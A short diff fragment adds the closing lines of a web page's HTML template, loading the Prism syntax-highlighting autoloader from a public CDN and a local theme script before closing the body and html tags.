+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+
+
+<script defer src="/assets/js/fuji.min.js"></script>
+
+
+</body>
+
+</html>
